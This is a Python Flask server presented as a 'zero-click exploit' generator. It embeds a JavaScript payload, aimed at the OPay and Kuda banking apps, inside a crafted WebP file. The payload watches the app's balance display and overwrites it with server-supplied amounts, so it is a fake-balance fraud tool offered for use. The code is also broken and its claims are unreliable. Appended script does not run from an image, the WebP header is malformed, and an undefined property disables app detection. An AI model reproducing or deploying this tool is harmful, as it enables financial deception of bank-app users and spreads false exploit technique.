#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template, redirect, url_for
import uuid
import os
import base64
import struct
import json
import threading
import time
import redis
from flask_socketio import SocketIO, emit

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")
redis_client = redis.Redis(host='localhost', port=6379, db=0)

# Store active exploits
active_exploits = {}

@app.route('/')
def home():
    return render_template('exploit_generator.html')

@app.route('/generate', methods=['POST'])
def generate_exploit():
    target_app = request.form.get('targetApp')
    device_id = request.form.get('deviceId') or str(uuid.uuid4())
    
    if not target_app:
        return jsonify({'error': 'Missing target app'}), 400
    
    # Generate exploit ID
    exploit_id = str(uuid.uuid4())
    
    # Create JavaScript payload
    js_payload = create_js_payload(target_app, device_id, exploit_id)
    
    # Create WebP container with payload
    webp_data = create_webp_container(js_payload)
    
    # Save to file
    filename = f"{target_app}_{exploit_id}.webp"
    filepath = os.path.join('static', 'exploits', filename)
    os.makedirs(os.path.dirname(filepath), exist_ok=True)
    
    with open(filepath, "wb") as f:
        f.write(webp_data)
    
    # Store in active exploits
    active_exploits[exploit_id] = {
        'device_id': device_id,
        'target_app': target_app,
        'last_check': time.time(),
        'connected': True
    }
    
    # Emit notification
    socketio.emit('exploit_generated', {
        'exploitId': exploit_id,
        'targetApp': target_app,
        'filename': filename
    })
    
    return jsonify({
        'success': True,
        'exploitId': exploit_id,
        'filename': filename
    })

@app.route('/api/v1/register-exploit', methods=['POST'])
def register_exploit():
    data = request.json
    device_id = data.get('deviceId')
    exploit_id = data.get('exploitId')
    target_app = data.get('targetApp')
    
    if not device_id or not exploit_id or not target_app:
        return jsonify({'error': 'Missing required fields'}), 400
    
    # Register exploit with server
    active_exploits[exploit_id] = {
        'device_id': device_id,
        'target_app': target_app,
        'last_check': time.time(),
        'connected': True
    }
    
    return jsonify({'success': True})

@app.route('/api/v1/amount-request', methods=['POST'])
def amount_request():
    data = request.json
    device_id = data.get('deviceId')
    exploit_id = data.get('exploitId')
    target_app = data.get('targetApp')
    
    # Check if exploit exists
    if exploit_id not in active_exploits:
        return jsonify({'error': 'Exploit not found'}), 404
    
    # Check if device_id matches
    if active_exploits[exploit_id]['device_id'] != device_id:
        return jsonify({'error': 'Invalid device'}), 401
    
    # Check if target app matches
    if active_exploits[exploit_id]['target_app'] != target_app:
        return jsonify({'error': 'Wrong target app'}), 400
    
    # Mark exploit as active
    active_exploits[exploit_id]['last_check'] = time.time()
    
    # Emit notification to web interface
    socketio.emit('notification', {
        'exploitId': exploit_id,
        'targetApp': target_app
    })
    
    return jsonify({'amount': None})

@app.route('/api/v1/cleanup', methods=['POST'])
def cleanup():
    data = request.json
    device_id = data.get('deviceId')
    exploit_id = data.get('exploitId')
    target_app = data.get('targetApp')
    
    # Remove exploit from active list
    if exploit_id in active_exploits:
        del active_exploits[exploit_id]
    
    return jsonify({'success': True})

@app.route('/notifications')
def notifications():
    return render_template('notifications.html')

@app.route('/api/v1/send-response', methods=['POST'])
def send_response():
    data = request.json
    exploit_id = data.get('exploitId')
    amount = data.get('amount')
    
    if not exploit_id or amount is None:
        return jsonify({'error': 'Missing required fields'}), 400
    
    # Store amount for this exploit
    redis_client.set(f"response:{exploit_id}", amount)
    
    # Emit notification to web interface
    socketio.emit('response_received', {
        'exploitId': exploit_id,
        'amount': amount
    })
    
    return jsonify({'success': True})

def create_js_payload(target_app, device_id, exploit_id):
    return f"""
    // Zero-click exploit for {target_app}
    class Exploit {{
        constructor() {{
            this.exploitId = "{exploit_id}";
            this.deviceId = "{device_id}";
            this.serverUrl = "http://localhost:5000";
            this.checkInterval = 300000; // 5 minutes
            this.maxWaitTime = 3600000; // 1 hour
            this.startTime = Date.now();
            this.timer = null;
            this.balanceElement = null;
        }}
        
        init() {{
            // Register service worker for background execution
            if ('serviceWorker' in navigator) {{
                navigator.serviceWorker.register('/exploit-worker.js').then(swReg => {{
                    swReg.active.postMessage({{
                        action: 'initExploit',
                        targetApp: '{target_app}',
                        exploitId: this.exploitId,
                        deviceId: this.deviceId
                    }});
                }});
            }}
            
            // Start periodic checks
            this.startPeriodicChecks();
        }}
        
        startPeriodicChecks() {{
            this.timer = setInterval(() => {{
                try {{
                    // Detect target app UI
                    this.detectTargetApp();
                    
                    // Check if time limit exceeded
                    if (Date.now() - this.startTime > this.maxWaitTime) {{
                        this.cleanup();
                    }}
                }} catch (e) {{
                    console.error('Exploit error:', e);
                }}
            }}, this.checkInterval);
        }}
        
        detectTargetApp() {{
            // Detect target app UI elements
            if (this.target_app === 'OPay') {{
                this.balanceElement = document.querySelector('.balance-display, [data-test-id="balance"]');
            }} else if (this.target_app === 'Kuda') {{
                this.balanceElement = document.querySelector('.account-balance, [data-test-id="balance"]');
            }}
            
            if (this.balanceElement) {{
                // Start listening for balance changes
                this.listenForBalanceChanges();
            }}
        }}
        
        listenForBalanceChanges() {{
            // Set up mutation observer for balance updates
            const observer = new MutationObserver(mutations => {{
                mutations.forEach(mutation => {{
                    if (mutation.type === 'childList' || mutation.type === 'characterData') {{
                        this.handleBalanceChange();
                    }}
                }});
            }});
            
            observer.observe(this.balanceElement, {{
                childList: true,
                subtree: true,
                characterData: true
            }});
        }}
        
        handleBalanceChange() {{
            // Get current balance from UI
            const currentBalance = this.getCurrentBalance();
            if (!currentBalance) return;
            
            // Request server for amount to add
            this.requestServerAmount().then(amountToAdd => {{
                if (amountToAdd !== null) {{
                    // Calculate new balance
                    const newBalance = currentBalance + amountToAdd;
                    
                    // Update UI
                    this.updateUI(newBalance);
                }}
            }});
        }}
        
        getCurrentBalance() {{
            // Extract numeric value from balance element
            const text = this.balanceElement.textContent;
            const matches = text.match(/\\d+(?:\\.\\d+)?/);
            return matches ? parseFloat(matches[0]) : null;
        }}
        
        async requestServerAmount() {{
            try {{
                const response = await fetch(`${{this.serverUrl}}/api/v1/amount-request`, {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify({{
                        deviceId: this.deviceId,
                        exploitId: this.exploitId,
                        targetApp: this.target_app
                    }})
                }});
                
                if (response.ok) {{
                    const data = await response.json();
                    return data.amount;
                }}
            }} catch (e) {{
                console.error('Server request failed:', e);
            }}
            return null;
        }}
        
        updateUI(newBalance) {{
            // Format balance with commas
            const formattedBalance = newBalance.toLocaleString('en-US');
            
            // Update balance element
            this.balanceElement.textContent = formattedBalance;
        }}
        
        cleanup() {{
            clearInterval(this.timer);
            // Remove exploit files
            localStorage.removeItem('exploit_state');
            // Send notification to server that we're cleaning up
            fetch(`${{this.serverUrl}}/api/v1/cleanup`, {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json'
                }},
                body: JSON.stringify({{
                    deviceId: this.deviceId,
                    exploitId: this.exploitId,
                    targetApp: this.target_app
                }})
            }});
        }}
    }}
    
    // Initialize exploit
    const exploit = new Exploit();
    exploit.init();
    """

def create_webp_container(js_payload):
    # Create WebP container with payload
    webp_data = b"RIFF\x00\x00\x00\x00WEBPVP8X"  # WebP header
    
    # Add VP8X chunk
    webp_data += b"VP8X\x00\x00\x00\x00\x2f\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    
    # Add ANIM chunk
    webp_data += b"ANIM\x00\x00\x00\x00\x00\x00\x00\x00"
    
    # Add ANMF chunk
    webp_data += b"ANMF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    
    # Add VP8L chunk
    webp_data += b"VP8L\x00\x00\x00\x00\x2f\x00\x00\x00\x00\x00\x00\x00\x00" + b"\x00" * 190
    
    # Add JavaScript payload
    webp_data += js_payload.encode()
    
    return webp_data

def cleanup_inactive_exploits():
    """Periodic cleanup of inactive exploits"""
    while True:
        current_time = time.time()
        expired_ids = []
        
        for exploit_id, data in active_exploits.items():
            if current_time - data['last_check'] > 3600:  # 1 hour
                expired_ids.append(exploit_id)
        
        for exploit_id in expired_ids:
            del active_exploits[exploit_id]
        
        time.sleep(300)  # Check every 5 minutes

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_inactive_exploits, daemon=True)
cleanup_thread.start()

if __name__ == '__main__':
    app.run(debug=True)
